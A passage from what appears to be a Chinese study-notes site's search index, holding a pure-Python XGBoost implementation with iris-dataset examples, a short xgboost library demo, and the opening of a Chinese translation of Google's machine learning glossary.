max_depth=self.max_depth, loss=self.loss) self.estimators.append(tree) def fit(self, X, y): y = to_categorical(y) y_pred = np.zeros(np.shape(y)) for i in range(self.n_estimators): tree = self.trees[i] y_and_pred = np.concatenate((y, y_pred), axis=1) tree.fit(X, y_and_pred) update_pred = tree.predict(X) y_pred -= np.multiply(self.learning_rate, update_pred) def predict(self, X): y_pred = None # \u9884\u6d4b for tree in self.estimators: update_pred = tree.predict(X) if y_pred is None: y_pred = np.zeros_like(update_pred) y_pred -= np.multiply(self.learning_rate, update_pred) y_pred = np.exp(y_pred) / np.sum(np.exp(y_pred), axis=1, keepdims=True) # \u5c06\u6982\u7387\u9884\u6d4b\u8f6c\u6362\u4e3a\u6807\u7b7e y_pred = np.argmax(y_pred, axis=1) return y_pred \u4f7f\u7528sklearn\u6570\u636e\u4f5c\u4e3a\u793a\u4f8b\uff1a from sklearn import datasets data = datasets.load_iris() X = data.data y = data.target X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.4, seed=2) clf = XGBoost() clf.fit(X_train, y_train) y_pred = clf.predict(X_test) accuracy = accuracy_score(y_test, y_pred) print (\"Accuracy:\", accuracy) Accuracy: 0.9666666666666667 3. \u8c03\u7528XGBoost\u5e93\u51fd\u6570 # XGBoost\u4e5f\u63d0\u4f9b\u4e86\u539f\u751f\u7684\u6a21\u578b\u5e93\u53ef\u4f9b\u6211\u4eec\u8c03\u7528\u3002pip\u5b89\u88c5xgboost\u5373\u53ef\uff1a pip install xgboost \u540c\u6837\u4f7f\u7528sklearn\u6570\u636e\u96c6\u8fdb\u884c\u6d4b\u8bd5\uff1a import xgboost as xgb from xgboost import plot_importance from matplotlib import pyplot as plt # \u8bbe\u7f6e\u6a21\u578b\u53c2\u6570 params = { 'booster': 'gbtree', 'objective': 'multi:softmax', 'num_class': 3, 'gamma': 0.1, 'max_depth': 2, 'lambda': 2, 'subsample': 0.7, 'colsample_bytree': 0.7, 'min_child_weight': 3, 'silent': 1, 'eta': 0.001, 'seed': 1000, 'nthread': 4, } plst = params.items() dtrain = xgb.DMatrix(X_train, y_train) num_rounds = 200 model = xgb.train(plst, dtrain, num_rounds) # \u5bf9\u6d4b\u8bd5\u96c6\u8fdb\u884c\u9884\u6d4b dtest = xgb.DMatrix(X_test) y_pred = model.predict(dtest) # \u8ba1\u7b97\u51c6\u786e\u7387 accuracy = accuracy_score(y_test, y_pred) print (\"Accuracy:\", accuracy) # \u7ed8\u5236\u7279\u5f81\u91cd\u8981\u6027 plot_importance(model) plt.show(); Accuracy: 0.9166666666666666 \u6ce8\uff1a\u4ee5\u4e0a\u4ee3\u7801\u8f6c\u81ea\u516c\u4f17\u53f7 \u673a\u5668\u5b66\u4e60\u5b9e\u9a8c\u5ba4 \u7684\u6587\u7ae0 \u300a\u6570\u5b66\u63a8\u5bfc+\u7eafPython\u5b9e\u73b0\u673a\u5668\u5b66\u4e60\u7b97\u6cd517\uff1aXGBoost\u300b \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.XGBoost\u7684\u7eafPython\u5b9e\u73b0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/2.XGBoost%E7%9A%84%E7%BA%AFPython%E5%AE%9E%E7%8E%B0/#xgboostpython","text":"","title":"XGBoost\u7684\u7eafPython\u5b9e\u73b0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/2.XGBoost%E7%9A%84%E7%BA%AFPython%E5%AE%9E%E7%8E%B0/#_1","text":"XGBoost\u7684\u7eafPython\u5b9e\u73b0 \u76ee\u5f55 1. \u80cc\u666f 2. XGBoost\u7684\u7eafPython\u5b9e\u73b0 3. \u8c03\u7528XGBoost\u5e93\u51fd\u6570","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/2.XGBoost%E7%9A%84%E7%BA%AFPython%E5%AE%9E%E7%8E%B0/#1","text":"\u5728 \u4e0a\u4e00\u671f\u7684\u7b14\u8bb0\u4e2d \uff0c\u6211\u4eec\u4e3b\u8981\u8ba8\u8bba\u4e86 XGBoost \u7684\u539f\u7406\uff0c\u6700\u8fd1\u6211\u5728\u516c\u4f17\u53f7 \u673a\u5668\u5b66\u4e60\u5b9e\u9a8c\u5ba4 \u770b\u5230\u4e00\u7bc7\u6587\u7ae0\uff0c\u91cc\u9762\u7ed9\u51fa\u4e86 XGBoost \u7684\u7eafpython\u5b9e\u73b0\uff0c\u521a\u597d\u80fd\u591f\u4f5c\u4e3a\u8865\u5145\uff0c\u4e8e\u662f\u6211\u5c06\u4ee3\u7801\u6458\u5f55\u4e86\u8fc7\u6765\uff0c\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\u3002","title":"1. \u80cc\u666f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/2.XGBoost%E7%9A%84%E7%BA%AFPython%E5%AE%9E%E7%8E%B0/#2-xgboostpython","text":"\u5b9a\u4e49XGBoost\u5355\u68f5\u6811\u6a21\u578b\u5982\u4e0b\uff1a class XGBoostTree(Tree): # \u7ed3\u70b9\u5206\u88c2 def _split(self, y): col = int(np.shape(y)[1]/2) y, y_pred = y[:, :col], y[:, col:] return y, y_pred # \u4fe1\u606f\u589e\u76ca\u8ba1\u7b97\u516c\u5f0f def _gain(self, y, y_pred): Gradient = np.power((y * self.loss.gradient(y, y_pred)).sum(), 2) Hessian = self.loss.hess(y, y_pred).sum() return 0.5 * (Gradient / Hessian) # \u6811\u5206\u88c2\u589e\u76ca\u8ba1\u7b97 def _gain_by_taylor(self, y, y1, y2): # \u7ed3\u70b9\u5206\u88c2 y, y_pred = self._split(y) y1, y1_pred = self._split(y1) y2, y2_pred = self._split(y2) true_gain = self._gain(y1, y1_pred) false_gain = self._gain(y2, y2_pred) gain = self._gain(y, y_pred) return true_gain + false_gain - gain # \u53f6\u5b50\u7ed3\u70b9\u6700\u4f18\u6743\u91cd def _approximate_update(self, y): # y split into y, y_pred y, y_pred = self._split(y) # Newton's Method gradient = np.sum(y * self.loss.gradient(y, y_pred), axis=0) hessian = np.sum(self.loss.hess(y, y_pred), axis=0) update_approximation = gradient / hessian return update_approximation # \u6811\u62df\u5408\u65b9\u6cd5 def fit(self, X, y): self._impurity_calculation = self._gain_by_taylor self._leaf_value_calculation = self._approximate_update super(XGBoostTree, self).fit(X, y) \u7136\u540e\u6839\u636e\u524d\u5411\u5206\u6b65\u7b97\u6cd5\u5b9a\u4e49XGBoost\u6a21\u578b\uff1a class XGBoost(object): def __init__(self, n_estimators=200, learning_rate=0.001, min_samples_split=2, min_impurity=1e-7, max_depth=2): self.n_estimators = n_estimators # Number of trees self.learning_rate = learning_rate # Step size for weight update self.min_samples_split = min_samples_split # The minimum n of sampels to justify split self.min_impurity = min_impurity # Minimum variance reduction to continue self.max_depth = max_depth # Maximum depth for tree # \u4ea4\u53c9\u71b5\u635f\u5931 self.loss = LogisticLoss() # \u521d\u59cb\u5316\u6a21\u578b self.estimators = [] # \u524d\u5411\u5206\u6b65\u8bad\u7ec3 for _ in range(n_estimators): tree = XGBoostTree( min_samples_split=self.min_samples_split, min_impurity=min_impurity, max_depth=self.max_depth, loss=self.loss) self.estimators.append(tree) def fit(self, X, y): y = to_categorical(y) y_pred = np.zeros(np.shape(y)) for i in range(self.n_estimators): tree = self.trees[i] y_and_pred = np.concatenate((y, y_pred), axis=1) tree.fit(X, y_and_pred) update_pred = tree.predict(X) y_pred -= np.multiply(self.learning_rate, update_pred) def predict(self, X): y_pred = None # \u9884\u6d4b for tree in self.estimators: update_pred = tree.predict(X) if y_pred is None: y_pred = np.zeros_like(update_pred) y_pred -= np.multiply(self.learning_rate, update_pred) y_pred = np.exp(y_pred) / np.sum(np.exp(y_pred), axis=1, keepdims=True) # \u5c06\u6982\u7387\u9884\u6d4b\u8f6c\u6362\u4e3a\u6807\u7b7e y_pred = np.argmax(y_pred, axis=1) return y_pred \u4f7f\u7528sklearn\u6570\u636e\u4f5c\u4e3a\u793a\u4f8b\uff1a from sklearn import datasets data = datasets.load_iris() X = data.data y = data.target X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.4, seed=2) clf = XGBoost() clf.fit(X_train, y_train) y_pred = clf.predict(X_test) accuracy = accuracy_score(y_test, y_pred) print (\"Accuracy:\", accuracy) Accuracy: 0.9666666666666667","title":"2. XGBoost\u7684\u7eafPython\u5b9e\u73b0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/2.XGBoost%E7%9A%84%E7%BA%AFPython%E5%AE%9E%E7%8E%B0/#3-xgboost","text":"XGBoost\u4e5f\u63d0\u4f9b\u4e86\u539f\u751f\u7684\u6a21\u578b\u5e93\u53ef\u4f9b\u6211\u4eec\u8c03\u7528\u3002pip\u5b89\u88c5xgboost\u5373\u53ef\uff1a pip install xgboost \u540c\u6837\u4f7f\u7528sklearn\u6570\u636e\u96c6\u8fdb\u884c\u6d4b\u8bd5\uff1a import xgboost as xgb from xgboost import plot_importance from matplotlib import pyplot as plt # \u8bbe\u7f6e\u6a21\u578b\u53c2\u6570 params = { 'booster': 'gbtree', 'objective': 'multi:softmax', 'num_class': 3, 'gamma': 0.1, 'max_depth': 2, 'lambda': 2, 'subsample': 0.7, 'colsample_bytree': 0.7, 'min_child_weight': 3, 'silent': 1, 'eta': 0.001, 'seed': 1000, 'nthread': 4, } plst = params.items() dtrain = xgb.DMatrix(X_train, y_train) num_rounds = 200 model = xgb.train(plst, dtrain, num_rounds) # \u5bf9\u6d4b\u8bd5\u96c6\u8fdb\u884c\u9884\u6d4b dtest = xgb.DMatrix(X_test) y_pred = model.predict(dtest) # \u8ba1\u7b97\u51c6\u786e\u7387 accuracy = accuracy_score(y_test, y_pred) print (\"Accuracy:\", accuracy) # \u7ed8\u5236\u7279\u5f81\u91cd\u8981\u6027 plot_importance(model) plt.show(); Accuracy: 0.9166666666666666 \u6ce8\uff1a\u4ee5\u4e0a\u4ee3\u7801\u8f6c\u81ea\u516c\u4f17\u53f7 \u673a\u5668\u5b66\u4e60\u5b9e\u9a8c\u5ba4 \u7684\u6587\u7ae0 \u300a\u6570\u5b66\u63a8\u5bfc+\u7eafPython\u5b9e\u73b0\u673a\u5668\u5b66\u4e60\u7b97\u6cd517\uff1aXGBoost\u300b \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u8c03\u7528XGBoost\u5e93\u51fd\u6570"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/","text":"Google \u673a\u5668\u5b66\u4e60\u672f\u8bed\u8868 # 1. \u80cc\u666f # Google\u51fa\u4e86\u4e00\u4efd\u673a\u5668\u5b66\u4e60\u672f\u8bed\u8868\uff0c\u5217\u51fa\u4e86\u4e00\u822c\u7684\u673a\u5668\u5b66\u4e60\u672f\u8bed\u548c TensorFlow \u4e13\u7528\u672f\u8bed\u7684\u5b9a\u4e49\uff0c\u5e76\u4e14\u7ffb\u8bd1\u6210\u4e86\u4e2d\u6587\uff0c\u5bf9\u7406\u89e3\u673a\u5668\u5b66\u4e60\u4e2d\u7684\u672f\u8bed\u5f88\u6709\u5e2e\u52a9\uff0c\u4e8e\u662f\u6211\u628a\u5b83\u8f6c\u8f7d\u8fc7\u6765\uff0c\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://developers.google.cn/machine-learning/glossary/?hl=zh-CN \u76ee\u5f55 # Google \u673a\u5668\u5b66\u4e60\u672f\u8bed\u8868 1. \u80cc\u666f \u76ee\u5f55 2. A 2.1. A/B \u6d4b\u8bd5 (A/B testing) 2.2. \u51c6\u786e\u7387 (accuracy) 2.3. \u6fc0\u6d3b\u51fd\u6570 (activation function) 2.4. AdaGrad 2.5. ROC \u66f2\u7ebf\u4e0b\u9762\u79ef (AUC, Area under the ROC Curve) 3. B 3.1. \u53cd\u5411\u4f20\u64ad\u7b97\u6cd5 (backpropagation) 3.2. \u57fa\u51c6 (baseline) 3.3. \u6279\u6b21 (batch) 3.4. \u6279\u6b21\u5927\u5c0f (batch size) 3.5. \u504f\u5dee (bias) 3.6. \u4e8c\u5143\u5206\u7c7b (binary classification) 3.7. \u5206\u7bb1 (binning) 3.8. \u5206\u6876 (bucketing) 4. C 4.1. \u6821\u51c6\u5c42 (calibration layer) 4.2. \u5019\u9009\u91c7\u6837 (candidate sampling) 4.3. \u5206\u7c7b\u6570\u636e (categorical data) 4.4. \u5f62\u5fc3 (centroid) 4.5. \u68c0\u67e5\u70b9 (checkpoint) 4.6. \u7c7b\u522b (class) 4.7. \u5206\u7c7b\u4e0d\u5e73\u8861\u7684\u6570\u636e\u96c6 (class-imbalanced data set) 4.8. \u5206\u7c7b\u6a21\u578b (classification model) 4.9. \u5206\u7c7b\u9608\u503c (classification threshold) 4.10. \u805a\u7c7b (clustering) 4.11. \u534f\u540c\u8fc7\u6ee4 (collaborative filtering) 4.12. \u6df7\u6dc6\u77e9\u9635 (confusion matrix) 4.13. \u8fde\u7eed\u7279\u5f81 (continuous feature) 4.14. \u6536\u655b (convergence) 4.15. \u51f8\u51fd\u6570 (convex function) 4.16. \u51f8\u4f18\u5316 (convex optimization) 4.17. \u51f8\u96c6 (convex set) 4.18. \u5377\u79ef (convolution) 4.19. \u5377\u79ef\u8fc7\u6ee4\u5668 (convolutional filter) 4.20. \u5377\u79ef\u5c42 (convolutional layer) 4.21. \u5377\u79ef\u795e\u7ecf\u7f51\u7edc (convolutional neural network) 4.22. \u5377\u79ef\u8fd0\u7b97 (convolutional operation) 4.23. \u6210\u672c (cost) 4.24. \u4ea4\u53c9\u71b5 (cross-entropy) 4.25. \u81ea\u5b9a\u4e49 Estimator (custom Estimator) 5. D 5.1. \u6570\u636e\u5206\u6790 (data analysis) 5.2. DataFrame 5.3. \u6570\u636e\u96c6 (data set) 5.4. Dataset API (tf.data) 5.5. \u51b3\u7b56\u8fb9\u754c (decision boundary) 5.6. \u5bc6\u96c6\u5c42 (dense layer) 5.7. \u6df1\u5ea6\u6a21\u578b (deep model) 5.8. \u5bc6\u96c6\u7279\u5f81 (dense feature) 5.9. \u8bbe\u5907 (device) 5.10. \u79bb\u6563\u7279\u5f81 (discrete feature) 5.11. \u4e22\u5f03\u6b63\u5219\u5316 (dropout regularization) 5.12. \u52a8\u6001\u6a21\u578b (dynamic model) 6. E 6.1. \u65e9\u505c\u6cd5 (early stopping) 6.2. \u5d4c\u5957 (embeddings) 6.3. \u7ecf\u9a8c\u98ce\u9669\u6700\u5c0f\u5316 (ERM, empirical risk minimization) 6.4. \u96c6\u6210\u5b66\u4e60 (ensemble) 6.5. \u5468\u671f (epoch) 6.6. Estimator 6.7. \u6837\u672c (example) 7. F 7.1. \u5047\u8d1f\u4f8b (FN, false negative) 7.2. \u5047\u6b63\u4f8b (FP, false positive) 7.3. \u5047\u6b63\u4f8b\u7387\uff08false positive rate, \u7b80\u79f0 FP \u7387\uff09 7.4. \u7279\u5f81 (feature) 7.5. \u7279\u5f81\u5217 (tf.feature_column) 7.6. \u7279\u5f81\u7ec4\u5408 (feature cross) 7.7. \u7279\u5f81\u5de5\u7a0b (feature engineering) 7.8. \u7279\u5f81\u96c6 (feature set) 7.9. \u7279\u5f81\u89c4\u8303 (feature spec) 7.10. \u5c11\u91cf\u6837\u672c\u5b66\u4e60 (few-shot learning) 7.11. \u5b8c\u6574 softmax (full softmax) 7.12. \u5168\u8fde\u63a5\u5c42 (fully connected layer) 8. G 8.1. \u6cdb\u5316 (generalization) 8.2. \u5e7f\u4e49\u7ebf\u6027\u6a21\u578b (generalized linear model) 8.3. \u68af\u5ea6 (gradient) 8.4. \u68af\u5ea6\u88c1\u526a (gradient clipping) 8.5. \u68af\u5ea6\u4e0b\u964d\u6cd5 (gradient descent) 8.6. \u56fe (graph) 9. H 9.1. \u542f\u53d1\u6cd5 (heuristic) 9.2. \u9690\u85cf\u5c42 (hidden layer) 9.3. \u5408\u9875\u635f\u5931\u51fd\u6570 (hinge loss) 9.4. \u7ef4\u6301\u6570\u636e (holdout data) 9.5. \u8d85\u53c2\u6570 (hyperparameter) 9.6. \u8d85\u5e73\u9762 (hyperplane) 10. I 10.1. \u72ec\u7acb\u540c\u7b49\u5206\u5e03 (i.i.d, independently and identically distributed) 10.2. \u63a8\u65ad (inference) 10.3. \u8f93\u5165\u51fd\u6570 (input function) 10.4. \u8f93\u5165\u5c42 (input layer) 10.5. \u5b9e\u4f8b (instance) 10.6. \u53ef\u89e3\u91ca\u6027 (interpretability) 10.7. \u8bc4\u5206\u8005\u95f4\u4e00\u81f4\u6027\u4fe1\u5ea6 (inter-rater agreement) 10.8. \u8fed\u4ee3 (iteration) 11. K 11.1. k-means 11.2. k-median 11.3. Keras 11.4. \u6838\u652f\u6301\u5411\u91cf\u673a (KSVM, Kernel Support Vector Machines) 12. L 12.1. L_1 \u635f\u5931\u51fd\u6570 (L_1 loss) 12.2. L_1 \u6b63\u5219\u5316 (L_1 regularization) 12.3. L_2 \u635f\u5931\u51fd\u6570 (L_2 loss) 12.4. L_2 \u6b63\u5219\u5316 (L_2 regularization) 12.5. \u6807\u7b7e (label) 12.6. \u6709\u6807\u7b7e\u6837\u672c (labeled example) 12.7. lambda 12.8. \u5c42 (layer) 12.9. Layers API (tf.layers) 12.10. \u5b66\u4e60\u901f\u7387 (learning rate) 12.11. \u6700\u5c0f\u4e8c\u4e58\u56de\u5f52 (least squares regression) 12.12. \u7ebf\u6027\u56de\u5f52 (linear regression) 12.13. \u903b\u8f91\u56de\u5f52 (logistic regression) 12.14. \u5bf9\u6570 (logits) 12.15. \u5bf9\u6570\u635f\u5931\u51fd\u6570 (Log Loss) 12.16. \u5bf9\u6570\u51e0\u7387 (log-odds) 12.17. \u635f\u5931 (Loss) 13. M 13.1. \u673a\u5668\u5b66\u4e60 (machine learning) 13.2. \u5747\u65b9\u8bef\u5dee (MSE, Mean Squared Error) 13.3. \u6307\u6807 (metric) 13.4. Metrics API (tf.metrics) 13.5. \u5c0f\u6279\u6b21 (mini-batch) 13.6. \u5c0f\u6279\u6b21\u968f\u673a\u68af\u5ea6\u4e0b\u964d\u6cd5 (SGD, mini-batch stochastic gradient descent) 13.7. ML 13.8. \u6a21\u578b (model) 13.9. \u6a21\u578b\u51fd\u6570 (model function) 13.10. \u6a21\u578b\u8bad\u7ec3 (model training) 13.11. \u52a8\u91cf (Momentum) 13.12. \u591a\u7c7b\u522b\u5206\u7c7b (multi-class classification) 13.13. \u591a\u9879\u5206\u7c7b (multinomial classification) 14. N 14.1. NaN \u9677\u9631 (NaN trap) 14.2. \u8d1f\u7c7b\u522b (negative class) 14.3. \u795e\u7ecf\u7f51\u7edc (neural network) 14.4. \u795e\u7ecf\u5143 (neuron) 14.5. \u8282\u70b9 (node) 14.6. \u6807\u51c6\u5316 (normalization) 14.7. \u6570\u503c\u6570\u636e (numerical data) 14.8. Numpy 15. O 15.1. \u76ee\u6807 (objective) 15.2. \u79bb\u7ebf\u63a8\u65ad (offline inference) 15.3. \u72ec\u70ed\u7f16\u7801 (one-hot encoding) 15.4. \u5355\u6837\u672c\u5b66\u4e60\uff08one-shot learning\uff0c\u901a\u5e38\u7528\u4e8e\u5bf9\u8c61\u5206\u7c7b\uff09 15.5. \u4e00\u5bf9\u591a (one-vs.-all) 15.6. \u5728\u7ebf\u63a8\u65ad (online inference) 15.7. \u64cd\u4f5c (op, Operation) 15.8. \u4f18\u5316\u5668 (optimizer) 15.9. \u79bb\u7fa4\u503c (outlier) 15.10. \u8f93\u51fa\u5c42 (output layer) 15.11. \u8fc7\u62df\u5408 (overfitting) 16. P 16.1. Pandas 16.2. \u53c2\u6570 (parameter) 16.3. \u53c2\u6570\u670d\u52a1\u5668 (PS, Parameter Server) 16.4. \u53c2\u6570\u66f4\u65b0 (parameter update) 16.5. \u504f\u5bfc\u6570 (partial derivative) 16.6. \u5212\u5206\u7b56\u7565 (partitioning strategy) 16.7. \u6027\u80fd (performance) 16.8. \u56f0\u60d1\u5ea6 (perplexity) 16.9. \u6d41\u6c34\u7ebf (pipeline) 16.10. \u6c60\u5316 (pooling) 16.11. \u6b63\u7c7b\u522b (positive class) 16.12. \u7cbe\u786e\u7387 (precision) 16.13. \u9884\u6d4b (prediction) 16.14. \u9884\u6d4b\u504f\u5dee (prediction bias) 16.15. \u9884\u521b\u5efa\u7684 Estimator (pre-made Estimator) 16.16. \u9884\u8bad\u7ec3\u6a21\u578b (pre-trained model) 16.17. \u5148\u9a8c\u4fe1\u5ff5 (prior belief) 17. Q 17.1. \u961f\u5217 (queue) 18. R 18.1. \u7b49\u7ea7 (rank) 18.2. \u8bc4\u5206\u8005 (rater) 18.3. \u53ec\u56de\u7387 (recall) 18.4. \u4fee\u6b63\u7ebf\u6027\u5355\u5143 (ReLU, Rectified Linear Unit) 18.5. \u56de\u5f52\u6a21\u578b (regression model) 18.6. \u6b63\u5219\u5316 (regularization) 18.7. \u6b63\u5219\u5316\u7387 (regularization rate) 18.8. \u8868\u793a\u6cd5 (representation) 18.9. \u53d7\u8bd5\u8005\u5de5\u4f5c\u7279\u5f81\u66f2\u7ebf\uff08receiver operating characteristic\uff0c\u7b80\u79f0 ROC \u66f2\u7ebf\uff09 18.10. \u6839\u76ee\u5f55 (root directory) 18.11. \u5747\u65b9\u6839\u8bef\u5dee (RMSE, Root Mean Squared Error) 18.12. \u65cb\u8f6c\u4e0d\u53d8\u6027 (rotational invariance) 19. S 19.1. SavedModel 19.2. Saver 19.3. \u7f29\u653e (scaling) 19.4. scikit-learn 19.5. \u534a\u76d1\u7763\u5f0f\u5b66\u4e60 (semi-supervised learning) 19.6. \u5e8f\u5217\u6a21\u578b (sequence model) 19.7. \u4f1a\u8bdd (tf.session) 19.8. S \u578b\u51fd\u6570 (sigmoid function) 19.9. \u5927\u5c0f\u4e0d\u53d8\u6027 (size invariance) 19.10. softmax 19.11. \u7a00\u758f\u7279\u5f81 (sparse feature) 19.12. \u7a00\u758f\u8868\u793a\u6cd5 (sparse representation) 19.13. \u7a00\u758f\u6027 (sparsity) 19.14. \u7a7a\u95f4\u6c60\u5316 (spatial pooling) 19.15. \u5e73\u65b9\u5408\u9875\u635f\u5931\u51fd\u6570 (squared hinge loss) 19.16. \u5e73\u65b9\u635f\u5931\u51fd\u6570 (squared loss) 19.17. \u9759\u6001\u6a21\u578b (static model) 19.18. \u5e73\u7a33\u6027 (stationarity) 19.19. \u6b65 (step) 19.20. \u6b65\u957f (step size) 19.21. \u968f\u673a\u68af\u5ea6\u4e0b\u964d\u6cd5 (SGD, stochastic gradient descent) 19.22. \u7ed3\u6784\u98ce\u9669\u6700\u5c0f\u5316 (SRM, structural risk minimization) 19.23. \u6b65\u957f (stride) 19.24. \u4e0b\u91c7\u6837 (subsampling) 19.25. \u603b\u7ed3 (summary) 19.26. \u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60 (supervised machine learning) 19.27. \u5408\u6210\u7279\u5f81 (synthetic feature) 20. T 20.1. \u76ee\u6807 (target) 20.2. \u65f6\u6001\u6570\u636e (temporal data) 20.3. \u5f20\u91cf (Tensor) 20.4. \u5f20\u91cf\u5904\u7406\u5355\u5143 (TPU, Tensor Processing Unit) 20.5. \u5f20\u91cf\u7b49\u7ea7 (Tensor rank) 20.6. \u5f20\u91cf\u5f62\u72b6 (Tensor shape) 20.7. \u5f20\u91cf\u5927\u5c0f (Tensor size) 20.8. TensorBoard 20.9. TensorFlow 20.10. TensorFlow Playground 20.11. TensorFlow Serving 20.12. \u6d4b\u8bd5\u96c6 (test set) 20.13. tf.Example 20.14. \u65f6\u95f4\u5e8f\u5217\u5206\u6790 (time series analysis) 20.15. \u8bad\u7ec3 (training) 20.16. \u8bad\u7ec3\u96c6 (training set) 20.17. \u8fc1\u79fb\u5b66\u4e60 (transfer learning) 20.18. \u5e73\u79fb\u4e0d\u53d8\u6027 (translational invariance) 20.19. \u8d1f\u4f8b (TN, true negative) 20.20. \u6b63\u4f8b (TP, true positive) 20.21. \u6b63\u4f8b\u7387\uff08true positive rate, \u7b80\u79f0 TP \u7387\uff09 21. U 21.1. \u65e0\u6807\u7b7e\u6837\u672c (unlabeled example) 21.2. \u975e\u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60 (unsupervised machine learning) 22. V 22.1. \u9a8c\u8bc1\u96c6 (validation set) 23. W 23.1. \u6743\u91cd (weight) 23.2. \u5bbd\u5ea6\u6a21\u578b (wide model) 2. A # 2.1. A/B \u6d4b\u8bd5 (A/B testing) # \u4e00\u79cd\u7edf\u8ba1\u65b9\u6cd5\uff0c\u7528\u4e8e\u5c06\u4e24\u79cd\u6216\u591a\u79cd\u6280\u672f\u8fdb\u884c\u6bd4\u8f83\uff0c\u901a\u5e38\u662f\u5c06\u5f53\u524d\u91c7\u7528\u7684\u6280\u672f\u4e0e\u65b0\u6280\u672f\u8fdb\u884c\u6bd4\u8f83\u3002A/B \u6d4b\u8bd5\u4e0d\u4ec5\u65e8\u5728\u786e\u5b9a\u54ea\u79cd\u6280\u672f\u7684\u6548\u679c\u66f4\u597d\uff0c\u800c\u4e14\u8fd8\u6709\u52a9\u4e8e\u4e86\u89e3\u76f8\u5e94\u5dee\u5f02\u662f\u5426\u5177\u6709\u663e\u8457\u7684\u7edf\u8ba1\u610f\u4e49\u3002A/B \u6d4b\u8bd5\u901a\u5e38\u662f\u91c7\u7528\u4e00\u79cd\u8861\u91cf\u65b9\u5f0f\u5bf9\u4e24\u79cd\u6280\u672f\u8fdb\u884c\u6bd4\u8f83\uff0c\u4f46\u4e5f\u9002\u7528\u4e8e\u4efb\u610f\u6709\u9650\u6570\u91cf\u7684\u6280\u672f\u548c\u8861\u91cf\u65b9\u5f0f\u3002 2.2. \u51c6\u786e\u7387 (accuracy) # \u5206\u7c7b\u6a21\u578b \u7684\u6b63\u786e\u9884\u6d4b\u6240\u5360\u7684\u6bd4\u4f8b\u3002\u5728 \u591a\u7c7b\u522b\u5206\u7c7b \u4e2d\uff0c\u51c6\u786e\u7387\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a \\text{\u51c6\u786e\u7387} = \\frac{\\text{\u6b63\u786e\u7684\u9884\u6d4b\u6570}}{\\text{\u6837\u672c\u603b\u6570}} \u5728 \u4e8c\u5143\u5206\u7c7b \u4e2d\uff0c\u51c6\u786e\u7387\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a \\text{\u51c6\u786e\u7387} = \\frac{\\text{\u6b63\u4f8b\u6570 + \u8d1f\u4f8b\u6570}}{\\text{\u6837\u672c\u603b\u6570}} \u8bf7\u53c2\u9605 \u6b63\u4f8b \u548c \u8d1f\u4f8b \u3002 2.3. \u6fc0\u6d3b\u51fd\u6570 (activation function) # \u4e00\u79cd\u51fd\u6570\uff08\u4f8b\u5982 ReLU \u6216 S \u578b\u51fd\u6570 \uff09\uff0c\u7528\u4e8e\u5bf9\u4e0a\u4e00\u5c42\u7684\u6240\u6709\u8f93\u5165\u6c42\u52a0\u6743\u548c\uff0c\u7136\u540e\u751f\u6210\u4e00\u4e2a\u8f93\u51fa\u503c\uff08\u901a\u5e38\u4e3a\u975e\u7ebf\u6027\u503c\uff09\uff0c\u5e76\u5c06\u5176\u4f20\u9012\u7ed9\u4e0b\u4e00\u5c42\u3002 2.4. AdaGrad # \u4e00\u79cd\u5148\u8fdb\u7684\u68af\u5ea6\u4e0b\u964d\u6cd5\uff0c\u7528\u4e8e\u91cd\u65b0\u8c03\u6574\u6bcf\u4e2a\u53c2\u6570\u7684\u68af\u5ea6\uff0c\u4ee5\u4fbf\u6709\u6548\u5730\u4e3a\u6bcf\u4e2a\u53c2\u6570\u6307\u5b9a\u72ec\u7acb\u7684 \u5b66\u4e60\u901f\u7387 \u3002\u5982\u9700\u67e5\u770b\u5b8c\u6574\u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u9605 \u8fd9\u7bc7\u8bba\u6587 \u3002 2.5. ROC \u66f2\u7ebf\u4e0b\u9762\u79ef (AUC, Area under the ROC Curve) # \u4e00\u79cd\u4f1a\u8003\u8651\u6240\u6709\u53ef\u80fd \u5206\u7c7b\u9608\u503c \u7684\u8bc4\u4f30\u6307\u6807\u3002 ROC \u66f2\u7ebf 